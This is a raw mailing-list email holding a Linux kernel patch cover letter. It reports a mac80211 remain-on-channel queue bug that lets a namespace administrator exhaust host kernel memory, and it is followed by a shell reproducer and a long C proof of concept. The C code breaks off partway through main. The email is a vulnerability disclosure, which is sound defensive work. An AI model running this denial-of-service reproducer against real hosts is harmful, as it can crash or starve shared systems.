Received: from mail-pj2-f13.google.com (mail-pj2-f13.google.com [74.125.227.141])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 4B16D55C332
	for <linux-wireless@vger.kernel.org>; Tue, 22 Sep 2026 15:39:29 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.141
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1790091571; cv=none; b=lR9DEM2bhZE0hPwCONnCMfwejjTD5tN7VEry0kGxmHJd9VgVFOGdb6n2KTCBK9GrV41lMIrliWgqPgDAiekgtSMIw7+k8jXb2N+0gxQR/vf9TXMZ5WiA5GVRU4IKf7mkq5LgO1ATLaKMiC6BW0gnwyjT0lrnz08RkDwZUQmjOk0=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1790091571; c=relaxed/simple;
	bh=e4+XPtOVPLqyTNlvwA6FMQSNw1nFPOnX55BB8WCO510=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=Y+JfOVnqLWAD9mqkMaDa/kJv1TAw9UwS+MT2mu5hBmS861piXY0PgALtHdHxh2mLmN/1oNNirzp30DiW5tyPz5wWwixBo2nHLx3piThzL87Y8eYwugukfKXkV9O0Sr4800yf4AQl18Fcs//r3lNuTxO5sFfxZql8EnTTUlp5h+E=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=ZCqE9gbg; arc=none smtp.client-ip=74.125.227.141
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="ZCqE9gbg"
Received: by mail-pj2-f13.google.com with SMTP id 98e67ed59e1d1-396cccbba91so28846a91.1
        for <linux-wireless@vger.kernel.org>; Tue, 22 Sep 2026 08:39:29 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1790091569; x=1790696369; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=Bz+dF5kyrkkOMTgAgpGlj3N7TjIAfAiXIy5c9SRg3jU=;
        b=ZCqE9gbgz2TpK4cxOJTyhfkI83iAP2FpMhBV0N1RvD209gp1fbfULNiyfuAI6GhFdM
         1uuMeXbihsiYL1ZyNX0dRpB8Udymk+WVKdTYlojz637V/SICVnUgwVsWMqHpV+ReAi8B
         P29I2FzpO43iekk27hy/CMtYh8kX2UacKGEyuhYUCMkS/0z9W4lazY3kAnxetjjEvpLE
         JkeMDSZICOPtDiQ+S9DE9yUKT3yM4oftOhbKcEDqI1FPCS+UAlaLgh4WzMZ0XoYhv2pb
         Fpz31Qj9HmJy5Z6MAXy1qjkceXOiT0CAZoe1CgDMRb/HT/6cmcI2mt+3NQnEES8b+CUe
         oefA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1790091569; x=1790696369;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=Bz+dF5kyrkkOMTgAgpGlj3N7TjIAfAiXIy5c9SRg3jU=;
        b=LNkHWrMq20bd9F8mLtB1cZVVL7R3b6cWCv9ExRvkm2AVND1MckFlsJOk9ATY951uv/
         ETW+BQ+7lzIZAjswjGAF0EFvCLefKiN4/T1RX+ThUTXDpFQMFUjuFfBO8Vd1Lkh4pKpO
         5YI6d/HqPRUeFdOMKktGGs14Nw3TYNzQ/Pw9JjzsNhWfd/TcsBadAixHF3jHGCeBC/lT
         auehzXzw6CikCJxksQ+ZqFrS+F54D80NYtlkM3e7G3Zxfmbd5nzVFKBPVJ1dhzuwbmLT
         t4Cv/swRqNKvNw3dN0eRga2f6F60ExJi7Hm63OoVvXcWFtR7wc6OOPUuxDrDjwL2wFJ1
         tU0A==
X-Gm-Message-State: AFuF++kVNWpxT+wLq6ErD2JfANmAbpzk8UT6ieF218SNKToG6SH5QOXq
	zj3Mj9KhAxOCwRDm812/8jf6/aberIIfiUowyjEZlu83UA7ppGo3GcBBWoDDLxlm7TQk/OrWtP6
	dRXdzoQ==
X-Gm-Gg: AYBFou0iWjvrk7Vv9mSt2raWKLknXwtCLFmJb8HoSkq2S4mBf2lQhMbQCopxb9FUyJR
	PbPg5/dAHYeaSjzDsodUheXBhRJYRxQ10xROois5WOpz8Hh3C/76Pf2rC3IVTPpksdhaPUclLML
	dKUurqZIgGhByZYiACDjs/z+EbNbVBBnLzmgQBpWi5LpIbVjCqKpJQ2tQxLPIalxXbsaD+IBdKw
	oTHTwl2Q/8zGsDsH3/d2pi9yivLt9RtPCFQD9QKFam4Z/+S3iH87dvhCQMnd7ch5ETVJqcarLYm
	DR3iroTLxBfjJv1T83Q1OV7Kud+QUzIKYZrYYHvrBKrbLffOB3x/Joei6JQFyx5UZ6vYPCy7j67
	hKkRj9ieCw+9129kaFs600k1c8c67oEyn/Bry9NAJJJRAcb9P6bvrOefzhELmg/CFRXOmn7C6bc
	5JNGRiRQMvQH6dLOmdovSjyzbrR8Lk9u4JS92G9GNjD/aP3C6n1EixPr49GTNWH+KjnuU36IiHE
	r899vrJ
X-Received: by 2002:a17:90b:3e85:b0:3a0:516d:9f87 with SMTP id 98e67ed59e1d1-3a073097e45mr1907116a91.13.1790091568169;
        Tue, 22 Sep 2026 08:39:28 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([167.71.204.91])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3a07dc7c7b0sm10180a91.2.2026.09.22.08.39.17
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Tue, 22 Sep 2026 08:39:27 -0700 (PDT)
From: Ren Wei <weir@nebusec.ai>
To: linux-wireless@vger.kernel.org
Cc: johannes@sipsolutions.net,
	linville@tuxdriver.com,
	vega@nebusec.ai,
	caoruide123@gmail.com,
	weir@nebusec.ai
Subject: [PATCH 0/1] mac80211: start next ROC after purging an interface
Date: Tue, 22 Sep 2026 23:38:53 +0800
Message-ID: <cover.1787220252.git.vega.cover-letter@nebusec.ai>
X-Mailer: git-send-email 2.53.0
Precedence: bulk
X-Mailing-List: linux-wireless@vger.kernel.org
List-Id: <linux-wireless.vger.kernel.org>
List-Subscribe: <mailto:linux-wireless+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-wireless+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Ruide Cao <caoruide123@gmail.com>

Hi Linux kernel maintainers,

We found an issue in net/mac80211/offchannel.c.

When a hardware ROC for interface A is active and another ROC for interface
B is queued, ieee80211_roc_purge(local, A) cancels and destroys A's started
ROC but never calls ieee80211_start_next_roc(). This is not repaired by
every driver: ath10k cancellation clears roc_notify before aborting, so
scan completion deliberately does not call
ieee80211_remain_on_channel_expired(). B consequently remains as an
unstarted roc_list head with no work scheduled. Further ROC requests
matching B are inserted behind that unstarted entry and likewise schedule
nothing, while scans defer because roc_list is nonempty. Repeated netlink
requests therefore retain an unbounded number of struct ieee80211_roc_work
allocations until another teardown or suspend purges them, allowing a
network-namespace administrator to exhaust host kernel memory.

Privilege model: network-namespace administrator (CAP_NET_ADMIN in a
user+network namespace is sufficient); the stuck ROC queue and unbounded
struct ieee80211_roc_work allocations can exhaust host kernel memory.

Compatibility: the change only restores next-ROC scheduling after a hardware
ROC purge when remaining entries exist; software ROC handling and unrelated
mac80211 paths are unchanged.

Tested: PoC reproduces the stuck-queue / OOM behavior in QEMU (2 vCPU / 2 GB);
details and crash evidence are below.

Reproducer:

#!/bin/sh
set -eu

CC=${CC:-gcc}
CFLAGS=${CFLAGS:-"-O2 -Wall -Wextra"}
TRACEFS=${TRACEFS:-/sys/kernel/tracing}
MODE=${1:-trace}
RADIOS=${RADIOS:-20}
LOOPS=${LOOPS:-100000}

$CC $CFLAGS -o poc poc.c

case "$MODE" in
trace)
	for ev in \
		events/cfg80211/rdev_remain_on_channel/enable \
		events/mac80211/drv_remain_on_channel/enable \
		events/mac80211/drv_cancel_remain_on_channel/enable \
		events/mac80211/api_remain_on_channel_expired/enable
	do
		printf 1 > "$TRACEFS/$ev"
	done
	printf 0 > "$TRACEFS/tracing_on"
	: > "$TRACEFS/trace"
	printf 1 > "$TRACEFS/tracing_on"
	./poc --mode roc --loops 4 --pause-before-loop-ms 1200
	sleep 1
	printf 0 > "$TRACEFS/tracing_on"
	grep -E \
		'rdev_remain_on_channel|drv_remain_on_channel|drv_cancel_remain_on_channel|api_remain_on_channel_expired' \
		"$TRACEFS/trace" || true
	;;
ns-trace)
	unshare -Urn sh -c "./poc --mode roc --loops 4 --pause-before-loop-ms 1200"
	;;
oom)
	sysctl -w vm.panic_on_oom=2
	i=1
	while [ "$i" -le "$RADIOS" ]; do
		echo "radio $i/$RADIOS"
		./poc --mode frame --loops "$LOOPS" || true
		i=$((i + 1))
	done
	;;
*)
	echo "usage: $0 [trace|ns-trace|oom]" >&2
	exit 1
	;;
esac


We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN PoC------

#define _GNU_SOURCE
#include <arpa/inet.h>
#include <errno.h>
#include <linux/genetlink.h>
#include <linux/netlink.h>
#include <linux/nl80211.h>
#include <net/if.h>
#include <stdbool.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#ifndef SOL_NETLINK
#define SOL_NETLINK 270
#endif

#ifndef NLA_HDRLEN
#define NLA_HDRLEN ((int) NLA_ALIGN(sizeof(struct nlattr)))
#endif

#ifndef NLA_ALIGNTO
#define NLA_ALIGNTO 4
#endif

#ifndef NLA_ALIGN
#define NLA_ALIGN(len) (((len) + NLA_ALIGNTO - 1) & ~(NLA_ALIGNTO - 1))
#endif

#ifndef NLA_OK
#define NLA_OK(nla, rem) ((rem) >= (int)sizeof(struct nlattr) && \
			  (nla)->nla_len >= sizeof(struct nlattr) && \
			  (nla)->nla_len <= (rem))
#endif

#ifndef NLA_NEXT
#define NLA_NEXT(nla, attrlen) ((attrlen) -= NLA_ALIGN((nla)->nla_len), \
				(struct nlattr *)((char *)(nla) + \
				NLA_ALIGN((nla)->nla_len)))
#endif

#define IW_BIN "/usr/sbin/iw"
#define IP_BIN "/usr/sbin/ip"

enum hwsim_commands_local {
	HWSIM_CMD_UNSPEC_LOCAL,
	HWSIM_CMD_REGISTER_LOCAL,
	HWSIM_CMD_FRAME_LOCAL,
	HWSIM_CMD_TX_INFO_FRAME_LOCAL,
	HWSIM_CMD_NEW_RADIO_LOCAL,
	HWSIM_CMD_DEL_RADIO_LOCAL,
	HWSIM_CMD_GET_RADIO_LOCAL,
};

enum hwsim_attrs_local {
	HWSIM_ATTR_UNSPEC_LOCAL,
	HWSIM_ATTR_ADDR_RECEIVER_LOCAL,
	HWSIM_ATTR_ADDR_TRANSMITTER_LOCAL,
	HWSIM_ATTR_FRAME_LOCAL,
	HWSIM_ATTR_FLAGS_LOCAL,
	HWSIM_ATTR_RX_RATE_LOCAL,
	HWSIM_ATTR_SIGNAL_LOCAL,
	HWSIM_ATTR_TX_INFO_LOCAL,
	HWSIM_ATTR_COOKIE_LOCAL,
	HWSIM_ATTR_CHANNELS_LOCAL,
	HWSIM_ATTR_RADIO_ID_LOCAL,
	HWSIM_ATTR_REG_HINT_ALPHA2_LOCAL,
	HWSIM_ATTR_REG_CUSTOM_REG_LOCAL,
	HWSIM_ATTR_REG_STRICT_REG_LOCAL,
	HWSIM_ATTR_SUPPORT_P2P_DEVICE_LOCAL,
	HWSIM_ATTR_USE_CHANCTX_LOCAL,
	HWSIM_ATTR_DESTROY_RADIO_ON_CLOSE_LOCAL,
	HWSIM_ATTR_RADIO_NAME_LOCAL,
	HWSIM_ATTR_NO_VIF_LOCAL,
};

struct nl_req {
	char buf[8192];
	struct nlmsghdr *nlh;
	struct genlmsghdr *genl;
	size_t max_len;
};

struct options {
	bool use_mgmt_tx;
	unsigned int loops;
	unsigned int frame_len;
	unsigned int duration_ms;
	unsigned int freq_a;
	unsigned int freq_b;
	unsigned int sleep_after_a_ms;
	unsigned int sleep_after_b_ms;
	unsigned int pause_before_loop_ms;
	char phy_name[32];
	char if_a[IFNAMSIZ];
	char if_b[IFNAMSIZ];
};

static uint32_t global_seq = 1;

static void die_perror(const char *what)
{
	perror(what);
	exit(1);
}

static void die_errno(const char *what, int err)
{
	fprintf(stderr, "%s: %s\n", what, strerror(-err));
	exit(1);
}

static void usage(const char *prog)
{
	fprintf(stderr,
		"Usage: %s [--mode roc|frame] [--loops N] [--frame-len N]\n"
		"          [--duration-ms N] [--freq-a MHz] [--freq-b MHz]\n"
		"          [--sleep-after-a-ms N] [--sleep-after-b-ms N]\n"
		"          [--pause-before-loop-ms N]\n",
		prog);
	exit(1);
}

static void parse_u32(const char *arg, unsigned int *dst, const char *name)
{
	char *end = NULL;
	unsigned long v;

	errno = 0;
	v = strtoul(arg, &end, 0);
	if (errno || !end || *end || v > UINT32_MAX) {
		fprintf(stderr, "invalid %s: %s\n", name, arg);
		exit(1);
	}
	*dst = (unsigned int)v;
}

static void parse_opts(int argc, char **argv, struct options *opts)
{
	unsigned int pid = (unsigned int)getpid();
	int i;

	memset(opts, 0, sizeof(*opts));
	opts->use_mgmt_tx = true;
	opts->loops = 5000;
	opts->frame_len = 2304;
	opts->duration_ms = 1000;
	opts->freq_a = 2412;
	opts->freq_b = 2437;
	opts->sleep_after_a_ms = 50;
	opts->sleep_after_b_ms = 20;
	opts->pause_before_loop_ms = 1500;
	snprintf(opts->phy_name, sizeof(opts->phy_name), "phyoc%u", pid);
	snprintf(opts->if_b, sizeof(opts->if_b), "rb%u", pid % 10000);

	for (i = 1; i < argc; i++) {
		if (!strcmp(argv[i], "--mode")) {
			if (++i >= argc)
				usage(argv[0]);
			if (!strcmp(argv[i], "roc"))
				opts->use_mgmt_tx = false;
			else if (!strcmp(argv[i], "frame"))
				opts->use_mgmt_tx = true;
			else
				usage(argv[0]);
			continue;
		}
		if (!strcmp(argv[i], "--loops")) {
			if (++i >= argc)
				usage(argv[0]);
			parse_u32(argv[i], &opts->loops, "loops");
			continue;
		}
		if (!strcmp(argv[i], "--frame-len")) {
			if (++i >= argc)
				usage(argv[0]);
			parse_u32(argv[i], &opts->frame_len, "frame length");
			continue;
		}
		if (!strcmp(argv[i], "--duration-ms")) {
			if (++i >= argc)
				usage(argv[0]);
			parse_u32(argv[i], &opts->duration_ms, "duration");
			continue;
		}
		if (!strcmp(argv[i], "--freq-a")) {
			if (++i >= argc)
				usage(argv[0]);
			parse_u32(argv[i], &opts->freq_a, "freq-a");
			continue;
		}
		if (!strcmp(argv[i], "--freq-b")) {
			if (++i >= argc)
				usage(argv[0]);
			parse_u32(argv[i], &opts->freq_b, "freq-b");
			continue;
		}
		if (!strcmp(argv[i], "--sleep-after-a-ms")) {
			if (++i >= argc)
				usage(argv[0]);
			parse_u32(argv[i], &opts->sleep_after_a_ms, "sleep-after-a-ms");
			continue;
		}
		if (!strcmp(argv[i], "--sleep-after-b-ms")) {
			if (++i >= argc)
				usage(argv[0]);
			parse_u32(argv[i], &opts->sleep_after_b_ms, "sleep-after-b-ms");
			continue;
		}
		if (!strcmp(argv[i], "--pause-before-loop-ms")) {
			if (++i >= argc)
				usage(argv[0]);
			parse_u32(argv[i], &opts->pause_before_loop_ms,
				  "pause-before-loop-ms");
			continue;
		}
		usage(argv[0]);
	}

	if (opts->frame_len < 26)
		opts->frame_len = 26;
}

static void msleep(unsigned int ms)
{
	struct timespec req;

	req.tv_sec = ms / 1000;
	req.tv_nsec = (long)(ms % 1000) * 1000000L;
	while (nanosleep(&req, &req) && errno == EINTR)
		;
}

static int nl_open(void)
{
	struct sockaddr_nl addr = {
		.nl_family = AF_NETLINK,
	};
	int fd;

	fd = socket(AF_NETLINK, SOCK_RAW | SOCK_CLOEXEC, NETLINK_GENERIC);
	if (fd < 0)
		die_perror("socket(NETLINK_GENERIC)");

	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die_perror("bind(NETLINK_GENERIC)");

	return fd;
}

static void nl_req_init(struct nl_req *req, uint16_t type, uint8_t cmd,
			uint16_t flags)
{
	memset(req, 0, sizeof(*req));
	req->max_len = sizeof(req->buf);
	req->nlh = (struct nlmsghdr *)req->buf;
	req->genl = (struct genlmsghdr *)(req->buf + NLMSG_HDRLEN);

	req->nlh->nlmsg_len = NLMSG_LENGTH(GENL_HDRLEN);
	req->nlh->nlmsg_type = type;
	req->nlh->nlmsg_flags = NLM_F_REQUEST | flags;
	req->nlh->nlmsg_seq = global_seq++;
	req->genl->cmd = cmd;
	req->genl->version = 1;
}

static int nl_attr_put(struct nl_req *req, uint16_t type, const void *data,
		       uint16_t len)
{
	struct nlattr *attr;
	size_t off = NLMSG_ALIGN(req->nlh->nlmsg_len);
	size_t total = NLA_HDRLEN + NLA_ALIGN(len);

	if (off + total > req->max_len)
		return -ENOBUFS;

	attr = (struct nlattr *)(req->buf + off);
	attr->nla_type = type;
	attr->nla_len = NLA_HDRLEN + len;
	if (len)
		memcpy((char *)attr + NLA_HDRLEN, data, len);
	if (NLA_ALIGN(len) > len)
		memset((char *)attr + NLA_HDRLEN + len, 0, NLA_ALIGN(len) - len);

	req->nlh->nlmsg_len = off + total;
	return 0;
}

static int nl_attr_put_u32(struct nl_req *req, uint16_t type, uint32_t value)
{
	return nl_attr_put(req, type, &value, sizeof(value));
}

static int nl_attr_put_flag(struct nl_req *req, uint16_t type)
{
	return nl_attr_put(req, type, NULL, 0);
}

static int nl_attr_put_string(struct nl_req *req, uint16_t type, const char *s)
{
	return nl_attr_put(req, type, s, (uint16_t)(strlen(s) + 1));
}

static int nl_send(int fd, struct nl_req *req)
{
	struct sockaddr_nl dst = {
		.nl_family = AF_NETLINK,
	};
	ssize_t ret;

	ret = sendto(fd, req->buf, req->nlh->nlmsg_len, 0,
		     (struct sockaddr *)&dst, sizeof(dst));
	if (ret < 0)
		return -errno;
	return 0;
}

static int nl_wait_nonerror(int fd, uint32_t seq)
{
	char buf[8192];

	for (;;) {
		struct nlmsghdr *nlh;
		ssize_t len;

		len = recv(fd, buf, sizeof(buf), 0);
		if (len < 0) {
			if (errno == EINTR)
				continue;
			return -errno;
		}

		for (nlh = (struct nlmsghdr *)buf; NLMSG_OK(nlh, len);
		     nlh = NLMSG_NEXT(nlh, len)) {
			if (nlh->nlmsg_seq != seq)
				continue;
			if (nlh->nlmsg_type == NLMSG_ERROR) {
				struct nlmsgerr *err = NLMSG_DATA(nlh);

				return err->error;
			}
			return 0;
		}
	}
}

static int nl_resolve_family(int fd, const char *family_name)
{
	char buf[8192];
	struct nl_req req;
	int ret;

	nl_req_init(&req, GENL_ID_CTRL, CTRL_CMD_GETFAMILY, 0);
	ret = nl_attr_put_string(&req, CTRL_ATTR_FAMILY_NAME, family_name);
	if (ret)
		die_errno("nl_attr_put_string", ret);
	ret = nl_send(fd, &req);
	if (ret)
		die_errno("send CTRL_CMD_GETFAMILY", ret);

	for (;;) {
		struct nlmsghdr *nlh;
		ssize_t len;

		len = recv(fd, buf, sizeof(buf), 0);
		if (len < 0) {
			if (errno == EINTR)
				continue;
			die_perror("recv CTRL_CMD_GETFAMILY");
		}

		for (nlh = (struct nlmsghdr *)buf; NLMSG_OK(nlh, len);
		     nlh = NLMSG_NEXT(nlh, len)) {
			struct genlmsghdr *genl;
			struct nlattr *attr;
			int attrlen;

			if (nlh->nlmsg_seq != req.nlh->nlmsg_seq)
				continue;
			if (nlh->nlmsg_type == NLMSG_ERROR) {
				struct nlmsgerr *err = NLMSG_DATA(nlh);
				die_errno("CTRL_CMD_GETFAMILY", err->error);
			}

			genl = NLMSG_DATA(nlh);
			attr = (struct nlattr *)((char *)genl + GENL_HDRLEN);
			attrlen = nlh->nlmsg_len - NLMSG_LENGTH(GENL_HDRLEN);

			for (; NLA_OK(attr, attrlen); attr = NLA_NEXT(attr, attrlen)) {
				if (attr->nla_type == CTRL_ATTR_FAMILY_ID) {
					uint16_t family_id;

					memcpy(&family_id, (char *)attr + NLA_HDRLEN,
					       sizeof(family_id));
					return family_id;
				}
			}
		}
	}
}

static int run_cmd(const char *fmt, ...)
{
	char cmd[512];
	va_list ap;
	int rc;

	va_start(ap, fmt);
	vsnprintf(cmd, sizeof(cmd), fmt, ap);
	va_end(ap);

	rc = system(cmd);
	if (rc != 0) {
		fprintf(stderr, "command failed (%d): %s\n", rc, cmd);
		return -1;
	}
	return 0;
}

static bool ifname_in_list(const struct if_nameindex *list, const char *name)
{
	const struct if_nameindex *it;

	for (it = list; it && it->if_index; it++) {
		if (!strcmp(it->if_name, name))
			return true;
	}

	return false;
}

static void wait_for_new_interface(const struct if_nameindex *before,
				   char ifname[IFNAMSIZ])
{
	int i;

	for (i = 0; i < 100; i++) {
		struct if_nameindex *after = if_nameindex();
		const struct if_nameindex *it;

		if (!after)
			die_perror("if_nameindex");

		for (it = after; it->if_index; it++) {
			if (ifname_in_list(before, it->if_name))
				continue;
			snprintf(ifname, IFNAMSIZ, "%s", it->if_name);
			if_freenameindex(after);
			return;
		}

		if_freenameindex(after);
		msleep(20);
	}

	fprintf(stderr, "timed out waiting for auto-created interface\n");
	exit(1);
}

static void get_hwaddr(const char *ifname, uint8_t addr[6])
{
	struct ifreq ifr;
	int fd;

	fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
	if (fd < 0)
		die_perror("socket(AF_INET)");

	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
		die_perror("SIOCGIFHWADDR");
	memcpy(addr, ifr.ifr_hwaddr.sa_data, 6);
	close(fd);
}

static void build_action_frame(uint8_t *buf, unsigned int len,
			       const uint8_t sa[6])
{
	static const uint8_t broadcast[6] = {
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
	};

	memset(buf, 0, len);
	buf[0] = 0xd0;
	buf[1] = 0x00;
	memcpy(buf + 4, broadcast, 6);
	memcpy(buf + 10, sa, 6);
	memcpy(buf + 16, broadcast, 6);
	buf[24] = 0x04;
	buf[25] = 0x09;
}

static int hwsim_new_radio(int fd, int family_id, const struct options *opts)
{
	struct nl_req req;
	int ret;

	nl_req_init(&req, family_id, HWSIM_CMD_NEW_RADIO_LOCAL, NLM_F_ACK);
	ret = nl_attr_put_flag(&req, HWSIM_ATTR_USE_CHANCTX_LOCAL);
	if (ret)
		return ret;
	ret = nl_attr_put_string(&req, HWSIM_ATTR_RADIO_NAME_LOCAL,
				 opts->phy_name);
	if (ret)
		return ret;
	ret = nl_send(fd, &req);
	if (ret)
		return ret;
	return nl_wait_nonerror(fd, req.nlh->nlmsg_seq);
}

static int hwsim_del_radio(int fd, int family_id, const struct options *opts)
{
	struct nl_req req;
	int ret;

	nl_req_init(&req, family_id, HWSIM_CMD_DEL_RADIO_LOCAL, NLM_F_ACK);
	ret = nl_attr_put_string(&req, HWSIM_ATTR_RADIO_NAME_LOCAL,
				 opts->phy_name);
	if (ret)
		return ret;
	ret = nl_send(fd, &req);
	if (ret)
		return ret;
	return nl_wait_nonerror(fd, req.nlh->nlmsg_seq);
}

static int hwsim_get_radio_name(int fd, int family_id, int radio_id,
				char *name, size_t name_len)
{
	char buf[8192];
	struct nl_req req;
	int ret;

	nl_req_init(&req, family_id, HWSIM_CMD_GET_RADIO_LOCAL, 0);
	ret = nl_attr_put_u32(&req, HWSIM_ATTR_RADIO_ID_LOCAL, (uint32_t)radio_id);
	if (ret)
		return ret;
	ret = nl_send(fd, &req);
	if (ret)
		return ret;

	for (;;) {
		struct nlmsghdr *nlh;
		ssize_t len;

		len = recv(fd, buf, sizeof(buf), 0);
		if (len < 0) {
			if (errno == EINTR)
				continue;
			return -errno;
		}

		for (nlh = (struct nlmsghdr *)buf; NLMSG_OK(nlh, len);
		     nlh = NLMSG_NEXT(nlh, len)) {
			struct genlmsghdr *genl;
			struct nlattr *attr;
			int attrlen;

			if (nlh->nlmsg_seq != req.nlh->nlmsg_seq)
				continue;
			if (nlh->nlmsg_type == NLMSG_ERROR) {
				struct nlmsgerr *err = NLMSG_DATA(nlh);
				return err->error;
			}

			genl = NLMSG_DATA(nlh);
			attr = (struct nlattr *)((char *)genl + GENL_HDRLEN);
			attrlen = nlh->nlmsg_len - NLMSG_LENGTH(GENL_HDRLEN);

			for (; NLA_OK(attr, attrlen); attr = NLA_NEXT(attr, attrlen)) {
				if (attr->nla_type != HWSIM_ATTR_RADIO_NAME_LOCAL)
					continue;
				snprintf(name, name_len, "%s",
					 (char *)attr + NLA_HDRLEN);
				return 0;
			}

			return -ENOENT;
		}
	}
}

static int nl80211_send_roc(int fd, int family_id, int ifindex,
			    unsigned int freq, unsigned int duration_ms)
{
	struct nl_req req;
	int ret;

	nl_req_init(&req, family_id, NL80211_CMD_REMAIN_ON_CHANNEL, NLM_F_ACK);
	ret = nl_attr_put_u32(&req, NL80211_ATTR_IFINDEX, ifindex);
	if (ret)
		return ret;
	ret = nl_attr_put_u32(&req, NL80211_ATTR_WIPHY_FREQ, freq);
	if (ret)
		return ret;
	ret = nl_attr_put_u32(&req, NL80211_ATTR_DURATION, duration_ms);
	if (ret)
		return ret;
	ret = nl_send(fd, &req);
	if (ret)
		return ret;
	return nl_wait_nonerror(fd, req.nlh->nlmsg_seq);
}

static int nl80211_send_frame(int fd, int family_id, int ifindex,
			      unsigned int freq, unsigned int duration_ms,
			      const void *frame, unsigned int frame_len)
{
	struct nl_req req;
	int ret;

	nl_req_init(&req, family_id, NL80211_CMD_FRAME, NLM_F_ACK);
	ret = nl_attr_put_u32(&req, NL80211_ATTR_IFINDEX, ifindex);
	if (ret)
		return ret;
	ret = nl_attr_put_flag(&req, NL80211_ATTR_OFFCHANNEL_TX_OK);
	if (ret)
		return ret;
	ret = nl_attr_put_u32(&req, NL80211_ATTR_WIPHY_FREQ, freq);
	if (ret)
		return ret;
	ret = nl_attr_put_u32(&req, NL80211_ATTR_DURATION, duration_ms);
	if (ret)
		return ret;
	ret = nl_attr_put(&req, NL80211_ATTR_FRAME, frame, frame_len);
	if (ret)
		return ret;
	ret = nl_send(fd, &req);
	if (ret)
		return ret;
	return nl_wait_nonerror(fd, req.nlh->nlmsg_seq);
}

static int send_work(int fd, int family_id, const struct options *opts,
		     int ifindex, unsigned int freq, const uint8_t *sa)
{
	if (!opts->use_mgmt_tx) {
		int ret = nl80211_send_roc(fd, family_id, ifindex, freq,
					   opts->duration_ms);
		if (ret)
			return ret;
		return 0;
	}

	{
		uint8_t *frame = calloc(1, opts->frame_len);
		int ret;

		if (!frame)
			return -ENOMEM;
		build_action_frame(frame, opts->frame_len, sa);
		ret = nl80211_send_frame(fd, family_id, ifindex, freq,
					 opts->duration_ms, frame,
					 opts->frame_len);
		free(frame);
		return ret;
	}
}

static void create_interfaces(const struct options *opts)
{
	if (run_cmd(IW_BIN " dev %s interface add %s type managed",
		    opts->if_a, opts->if_b))
		exit(1);
	if (run_cmd(IP_BIN " link set %s up", opts->if_a))
		exit(1);
	if (run_cmd(IP_BIN " link set %s up", opts->if_b))
		exit(1);
}

int main(int argc, char **argv)
{
	struct options opts;
	uint8_t sa_a[6], sa_b[6];
	int hwsim_fd, nl80211_fd, hwsim_family, nl80211_family;
	int if_a, if_b;
	struct if_nameindex *before_ifaces;
	unsigned int i;
	int radio_id, ret;

	parse_opts(argc, argv, &opts);

	printf("mode=%s loops=%u frame_len=%u duration_ms=%u\n",
	       opts.use_mgmt_tx ? "frame" : "roc",
	       opts.loops, opts.frame_len, opts.duration_ms);
	printf("creating hwsim radio %s and a second interface %s\n",
	       opts.phy_name, opts.if_b);

	hwsim_fd = nl_open();
	nl80211_fd = nl_open();

	hwsim_family = nl_resolve_family(hwsim_fd, "MAC80211_HWSIM");
	nl80211_family = nl_resolve_family(nl80211_fd, "nl80211");
	before_ifaces = if_nameindex();
	if (!before_ifaces)
		die_perror("if_nameindex");

	radio_id = hwsim_new_radio(hwsim_fd, hwsim_family, &opts);
	if (radio_id < 0)
		die_errno("HWSIM_CMD_NEW_RADIO", radio_id);
	if (radio_id > 0) {
		ret = hwsim_get_radio_name(hwsim_fd, hwsim_family, radio_id,
					   opts.phy_name, sizeof(opts.phy_name));
		if (ret)
			die_errno("HWSIM_CMD_GET_RADIO", ret);
	}

	wait_for_new_interface(before_ifaces, opts.if_a);
	if_freenameindex(before_ifaces);

	printf("using radio id=%d phy=%s if_a=%s if_b=%s\n",
	       radio_id, opts.phy_name, opts.if_a, opts.if_b);

	create_interfaces(&opts);

	if_a = if_nametoindex(opts.if_a);
	if_b = if_nametoindex(opts.if_b);
	if (!if_a || !if_b)
		die_perror("if_nametoindex");

	get_hwaddr(opts.if_a, sa_a);
	get_hwaddr(opts.if_b, sa_b);

	printf("queueing active work on %s, then queued work on %s\n",
